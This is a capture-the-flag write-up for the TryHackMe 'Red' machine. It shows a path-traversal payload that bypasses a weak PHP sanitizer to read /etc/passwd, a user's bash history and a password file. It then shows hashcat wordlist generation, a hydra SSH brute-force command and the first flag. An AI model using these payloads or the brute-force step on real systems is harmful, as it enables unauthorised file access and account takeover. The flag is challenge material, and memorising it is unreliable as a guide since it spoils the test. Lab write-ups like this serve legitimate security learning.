# RED

#### 1. Accessing `view-source:http://10.10.87.149//index.php?page=index.php` using `Burpsuite Repeater`
#### what resulted with this:
```bash
<?php 

function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}

$page = $_GET['page'];
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
    readfile($page);
} else {
    header('Location: /index.php?page=home.html');
}

?>
```

#### 2. After analysing above code i get this conclusion:
- What we initially have:
```bash
../../etc/passwd
```
- After analysing `sanitize_input()` function i understand i have to do this:
```bash
.....///.....///.....///.....///etc/passwd
```
- Then we have condition that before whole string there must be word that is made of only small letters, we take `about` directory as consideration
```bash
about/.....///.....///.....///.....///etc/passwd
```
#### 3. Now we pass that to `Burpsuite Repeater` again:
- We change `page` parameter and send:
```bash
GET //index.php?page=about/.....///.....///.....///.....///etc/passwd HTTP/1.1
Host: 10.10.87.149
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.10.87.149//index.php?page=portfolio.html
Connection: close
Upgrade-Insecure-Requests: 1
```

#### 4. And we in! That is the output:
```bash
HTTP/1.1 200 OK
Date: Wed, 18 Oct 2023 20:54:09 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1858
Connection: close
Content-Type: text/html; charset=UTF-8

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
blue:x:1000:1000:blue:/home/blue:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
red:x:1001:1001::/home/red:/bin/bash
```

#### 5. Then we do a little searching up:
- Checking /home/blue/.bash_history directory (`about/.....///.....///.....///.....///home/blue/.bash_history`), as results:
```bash
HTTP/1.1 200 OK
Date: Wed, 18 Oct 2023 20:58:56 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 166
Connection: close
Content-Type: text/html; charset=UTF-8

echo "Red rules"
cd
hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
cat passlist.txt
rm passlist.txt
sudo apt-get remove hashcat -y
```
##### We can tell that blue was doing something here.... Especially, there is interesting point about `.reminder` file.. We should check that

- Checking /home/blue/.reminder what results:
```bash
HTTP/1.1 200 OK
Date: Wed, 18 Oct 2023 21:00:24 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 16
Connection: close
Content-Type: text/html; charset=UTF-8

sup3r_p@s$w0rd!
```
#### 6. We may get password here! let's repeat steps that blue did on this machine, and then try `hydra` with username `blue`:
```bash
hydra -l blue -P passlist.txt 10.10.87.149 ssh -t 16
```

##### We have it! Let's login with `ssh`
```bash
[22][ssh] host: 10.10.87.149   login: blue   password: thesup3r_p@s$w0rd!
```

##### We have first flag:
`THM{Is_thAt_all_y0u_can_d0_blU3?}`

#### 7. Now we need to find the second, and third...
